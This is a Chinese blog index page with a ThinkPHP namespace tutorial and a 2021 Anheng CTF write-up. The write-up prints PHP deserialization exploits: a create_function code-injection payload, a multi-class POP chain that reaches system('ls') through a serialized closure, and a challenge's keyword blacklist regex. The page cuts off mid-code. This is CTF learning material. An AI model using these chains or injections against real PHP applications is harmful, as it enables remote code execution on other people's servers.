<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="vague huang"><meta name="copyright" content="vague huang"><title>Tlife</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">vague huang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">217</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Tlife</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Tlife</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/09/26/PHP%E6%A1%86%E6%9E%B6%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/">PHP框架基础语法学习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-09-26</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>刚好最近做的挺多挖链子的题目都有涉及命名空间的知识点，之前都是在一个php文件中进行了链子的挖掘，现在分散到很多文件中，虽然本质是一样的，但是如果没有理解好命名空间的含义，一时半会想要做出来也是有难度的</p>
<h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><p>要理解好命名空间的话可以和目录做一个类比，比如说有一个目录为/home他下面有一个foo.txt，那么对于这个foo.txt来说，这个home就是一个命名空间，</p>
<p>命名空间的声明可避免类或函数名重复导致的各种问题。使用namespace可以声明、切换命名空间。</p>
<p>在程序当中，其作用是按照一种虚拟的层次结构组织 PHP 代码，这种层次结构类似操作系统中文件系统的目录结构。</p>
<p>直接举个栗子：一个典型的控制器类定义如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">namespace app\index\controller;</span><br><span class="line"></span><br><span class="line">class Index </span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        return &#39;index&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>控制器类文件的实际位置是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">application\index\controller\Index.php</span><br></pre></td></tr></table></figure>

<p>当控制器的定义为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">namespace app\index\controller;</span><br><span class="line"></span><br><span class="line">class Index </span><br><span class="line">&#123;</span><br><span class="line">    public function hello()</span><br><span class="line">    &#123;</span><br><span class="line">        return &#39;hello,world!&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function data()</span><br><span class="line">    &#123;</span><br><span class="line">        return [&#39;name&#39;&#x3D;&gt;&#39;thinkphp&#39;,&#39;status&#39;&#x3D;&gt;1];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么想要访问不同的路由就要:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php&#x2F;index&#x2F;Index&#x2F;hello</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php&#x2F;index&#x2F;Index&#x2F;data</span><br></pre></td></tr></table></figure>

<p>回来看一下源码要访问下面的内容的路由就为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;index&#x2F;index&#x2F;backdoor</span><br></pre></td></tr></table></figure>

<h2 id="什么是控制器？"><a href="#什么是控制器？" class="headerlink" title="什么是控制器？"></a>什么是控制器？</h2><p>控制器就是<code>MVC</code>设计模式中的C（<code>Controller</code>），通常用于读取视图V（<code>View</code>）、完成用户输入以及处理模型数据M（<code>Model</code>）。</p>
<p>按照ThinkPHP的架构设计，所有的URL请求（无论是否采用了路由），最终都会定位到控制器（也许实际的类不一定是控制器类，但也属于广义范畴的控制器）。控制器的层可能有很多，为了便于区分就把通过URL访问的控制器称之为访问控制器（通常意义上我们所说的控制器就是指访问控制器）。</p>
<p>例如我们访问一个URL地址：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;tp5.com&#x2F;index&#x2F;index&#x2F;hello</span><br></pre></td></tr></table></figure>

<p>实际上访问的是<code>index</code>模块下的<code>Index</code>控制器类的<code>hello</code>方法（在没有定义任何路由的情况下），<code>Index</code>控制器对应的类就是<code>app\index\controller\Index</code>（为什么控制器类名需要这样命名后面命名空间部分会详细描述），完成上面的URL访问，只需要定义如下的控制器类，看起来非常简单：</p>
<h2 id="什么是命名空间"><a href="#什么是命名空间" class="headerlink" title="什么是命名空间"></a>什么是命名空间</h2><p>现在来分析下控制器的类名为什么是<code>app\index\controller\Index</code>而不是<code>Index</code>，首先就是要明白命名空间的概念。PHP从5.3版本开始引入命名空间的概念，其主要作用是确保类名不会冲突，因为在一个应用中，出现相同的类名的几率非常之大，并且你很难保证引入的第三方类库不冲突，而有了命名空间后，相当于给自己的类加了一个门牌号一样，一个类的组成包括：</p>
<blockquote>
<h3 id="类的组成-根命名空间-子命名空间（可选）-类名"><a href="#类的组成-根命名空间-子命名空间（可选）-类名" class="headerlink" title="类的组成 = 根命名空间+子命名空间（可选）+类名"></a>类的组成 = 根命名空间+子命名空间（可选）+类名</h3></blockquote>
<p>app\index\controller\Index<code>，这是ThinkPHP框架制定的规范，</code>app<code>是应用类库的根命名空间，也就是所有的应用类库都应该用</code>app<code>作为根命名空间定义。</code>index<code>是表示模块目录，</code>controller<code>表示的是控制器（确切的说是访问控制器）目录，</code>Index<code>是实际的控制器类名，所以要表示</code>index<code>模块的</code>Index<code>控制器类，使用的就是</code>app\index\controller\Index<code>，如果是</code>admin<code>模块的</code>Index<code>控制器类，使用的就是</code>app\admin\controller\Index<code>类，如果使用的是单一模块的话，那么</code>Index<code>控制器类就变成了</code>app\controller\Index</p>
<h2 id="控制器继承"><a href="#控制器继承" class="headerlink" title="控制器继承"></a>控制器继承</h2><p>前面是一个很简单的例子，没有继承任何的类（这样并没有任何不对，5.0的控制器设计如此，事实上也非常高效），控制器可以继承系统内置的控制器基类<code>think\Controller</code>或者应用自己的控制器基类，来扩展更多的功能和方法。</p>
<p>继承系统控制器基类：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line"></span><br><span class="line">use think\Controller;</span><br><span class="line"></span><br><span class="line">class Index  extends Controller</span><br><span class="line">&#123;</span><br><span class="line">    public function hello()</span><br><span class="line">    &#123;</span><br><span class="line">        return &#39;hello,world&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/09/25/2021%E5%AE%89%E6%81%929%E6%9C%88%E8%B5%9B/">2021安恒9月赛</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-09-25</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>战队的神仙大佬们都在打TCTF，我看不懂题目但我大为震撼，而我还在打安恒月赛，这大概就是世界的参差吧。。。。</p>
<h2 id="hellounser"><a href="#hellounser" class="headerlink" title="hellounser"></a>hellounser</h2><p>拿了一个一血，可能是题目比较简单吧</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;var;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $func;</span><br><span class="line">    <span class="keyword">public</span> $arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $func = <span class="keyword">$this</span>-&gt;func;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="keyword">$this</span>-&gt;func) || preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#x27;</span>, <span class="keyword">$this</span>-&gt;arg)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;No!No!No!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">            <span class="comment">//There is no code to print flag in flag.php</span></span><br><span class="line">            $func(<span class="string">&#x27;&#x27;</span>, <span class="keyword">$this</span>-&gt;arg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;show();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;Nice Job!!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> A();</span><br><span class="line">$b=<span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;func=<span class="string">&quot;create_function&quot;</span>;</span><br><span class="line">$b-&gt;arg=<span class="string">&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//&quot;</span>;</span><br><span class="line">$a-&gt;var=$b;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="xxc"><a href="#xxc" class="headerlink" title="xxc"></a>xxc</h2><p>发现自己在挖掘这种框架下的链子的时候很不熟练，主要是不会书写命名空间的语法<br>首先是确定起点——&gt;寻找destruct魔术方法，其中$process可控，并且指向一个函数，寻找__call看看有没有_call方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Control</span>\<span class="title">State</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StopHook</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $output;</span><br><span class="line">    <span class="keyword">protected</span> $config = [<span class="string">&#x27;auto&#x27;</span> =&gt; <span class="number">0</span>];</span><br><span class="line">    <span class="keyword">protected</span> <span class="built_in">static</span> $states = [<span class="string">&#x27;started&#x27;</span>, <span class="string">&#x27;running&#x27;</span>, <span class="string">&#x27;finished&#x27;</span>, <span class="string">&#x27;waiting&#x27;</span>, <span class="string">&#x27;fail&#x27;</span>];</span><br><span class="line">    <span class="keyword">protected</span> $processes;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_exit();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_exit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(array_reverse(<span class="keyword">$this</span>-&gt;processes) <span class="keyword">as</span> $process) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!$process-&gt;isRunning) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $process-&gt;stop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在这个命名空间下有call方法，让其跳转至此，发现一个echo，看看是否有__tostring方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyGenerator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $defaultValue;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$method, $arg_array</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;defaultCall;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;defaultCall;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$property</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;defaultValue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个命名空间下可以发现一个tostring，跟进以后，发现其存在一个isset，那么就只需要寻找__isset魔术方法，看看是否能继续跳转</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFile</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $flag = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">private</span> $files = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getFiles();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFiles</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;flag) <span class="keyword">return</span> <span class="string">&quot;denied&quot;</span>;</span><br><span class="line">        $s = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;flag-&gt;&#123;<span class="keyword">$this</span>-&gt;value&#125;)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            $s += $file-&gt;read();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里会回来执行popup，并且存在一个$s($length)，类似于调用一个函数，那么如果将这个函数调用方式改为对象，即可触发__invoke方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetDefault</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $source;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">popup</span>(<span class="params">$length</span>) </span>&#123;</span><br><span class="line">        $s = <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">        <span class="keyword">if</span> ($s-&gt;flag != <span class="string">&quot;myTest&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;denied&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $s($length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params">$property</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($property != <span class="string">&quot;test&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;popup(<span class="number">666</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>序列化终点就在这里，调用这个call_user_func实现命令执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GenerateFile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $flag;</span><br><span class="line">    <span class="keyword">protected</span> $buffer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params">$param</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;myGen($param);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">myGen</span>(<span class="params">$length</span>) </span>&#123;</span><br><span class="line">        $s = <span class="keyword">$this</span>-&gt;buffer-&gt;read;</span><br><span class="line">        call_user_func(<span class="keyword">$this</span>-&gt;source-&gt;generate, $length);</span><br><span class="line">        <span class="keyword">return</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么最终构造的链条如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Control</span>\<span class="title">State</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Faker</span>\<span class="title">MyGenerator</span>;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">StopHook</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $output;</span><br><span class="line">        <span class="keyword">protected</span> $config = [<span class="string">&#x27;auto&#x27;</span> =&gt; <span class="number">0</span>];</span><br><span class="line">        <span class="keyword">protected</span> <span class="built_in">static</span> $states = [<span class="string">&#x27;started&#x27;</span>, <span class="string">&#x27;running&#x27;</span>, <span class="string">&#x27;finished&#x27;</span>, <span class="string">&#x27;waiting&#x27;</span>, <span class="string">&#x27;fail&#x27;</span>];</span><br><span class="line">        <span class="keyword">protected</span> $processes;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes=<span class="keyword">array</span>(<span class="keyword">new</span> MyGenerator());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_exit();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_exit</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">foreach</span> (array_reverse(<span class="keyword">$this</span>-&gt;processes) <span class="keyword">as</span> $process) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!$process-&gt;isRunning) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                $process-&gt;stop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;D:\apache\www\安恒月赛\www\closure/autoload.php&quot;</span>);<span class="comment">#这边似乎不影响，我在本地需要调用这个文件，但是题目已经自动给你包含了，所以问题不大</span></span><br><span class="line">    $a=<span class="keyword">new</span> StopHook();</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize($a));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Method</span>\<span class="title">Func</span>\<span class="title">GetFile</span>;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyGenerator</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> $defaultValue;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)#构建对象时被调用</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;defaultValue = <span class="keyword">new</span> GetFile();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$method, $arg_array</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;defaultCall;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;defaultCall;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$property</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;defaultValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>;</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">GetFile</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $flag = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">private</span> $files = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;flag = <span class="keyword">new</span> GetDefault();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;value = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getFiles();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFiles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;flag) <span class="keyword">return</span> <span class="string">&quot;denied&quot;</span>;</span><br><span class="line">            $s = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;flag-&gt;&#123;<span class="keyword">$this</span>-&gt;value&#125;)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">                $s += $file-&gt;read();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $s;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">GetDefault</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $source;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="keyword">new</span> GenerateFile();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source-&gt;flag = <span class="string">&quot;myTest&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">popup</span>(<span class="params">$length</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $s = <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">            <span class="keyword">if</span> ($s-&gt;flag != <span class="string">&quot;myTest&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;denied&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $s($length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params">$property</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> ($property != <span class="string">&quot;test&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;popup(<span class="number">666</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">GenerateFile</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $flag;</span><br><span class="line">        <span class="keyword">protected</span> $buffer;</span><br><span class="line">        <span class="keyword">public</span> $source;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $function = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                system(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">            &#125;;</span><br><span class="line">            $a = \Opis\<span class="built_in">Closure</span>\serialize($function);</span><br><span class="line">            $b = unserialize($a);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source-&gt;generate = $b;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params">$param</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;myGen($param);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span 